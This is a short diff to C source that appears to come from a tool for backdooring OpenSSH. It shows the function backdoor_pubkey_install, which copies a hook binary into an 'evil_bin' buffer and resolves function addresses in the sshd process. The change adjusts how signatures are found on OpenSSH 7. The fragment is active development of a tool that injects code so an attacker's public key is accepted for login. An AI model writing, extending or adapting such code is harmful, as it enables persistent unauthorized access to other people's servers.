@@ -34,13 +34,11 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 	u64 user_key_allowed2_calls[MAX_KEY_ALLOWED_CALLS];
 	u64 diff=0, hole_addr=0;
 
-
-
 	evil_bin = malloc(hook_pubkey_bin_len);
 	memcpy(evil_bin, hook_pubkey_bin, hook_pubkey_bin_len);
 
 	for(i = 0; i < sizeof(signatures) / sizeof(signature); i++) {
-		if (i < 99) {
+		if (ctx->is_openssh7 == 0 || i < 2) {
 			signatures[i].addr = sub_by_debugstr(ctx, signatures[i].str);
 		} else {
 			u64 f_dsa_new, f_bn_new, p_dsa_new, p_bn_new, callpair, callpair_b, p_rsa_free, p_dsa_free;
